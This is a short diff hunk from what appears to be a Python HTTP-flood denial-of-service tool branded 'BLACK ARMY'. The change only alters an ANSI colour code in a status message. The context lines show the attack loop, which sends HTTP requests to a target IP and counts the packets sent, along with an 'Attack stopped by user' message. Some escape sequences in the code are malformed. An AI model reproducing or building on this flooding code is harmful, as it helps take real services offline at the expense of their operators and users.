@@ -149,7 +149,7 @@ def http_flood(ip, port, duration):
             sock.sendall(http_request)
             sent += 1
             print(f"\033[31m[]\03341m\033[91BLACK ARMY \033[0m  \033[100m\033[31mHTTP Packets sent\033[0m  \033[32m{sent} to target \033[103m \033[91m {ip}\033[0m")
-            print(f"\033[33m[]\033[32m BLACK ARMY \033[0m  \033[32mHTTP Packets sent \033[0m  \033[33m{sent} to target \033[31m {ip}\033[0m")
+            print(f"\033[33m[]\033[32m BLACK ARMY \033[0m  \033[32mHTTP Packets sent \033[0m  \033[33m{sent} to target \033[38;5;206m {ip}\033[0m")
         except KeyboardInterrupt:
             print("\n[-] Attack stopped by user")
             break
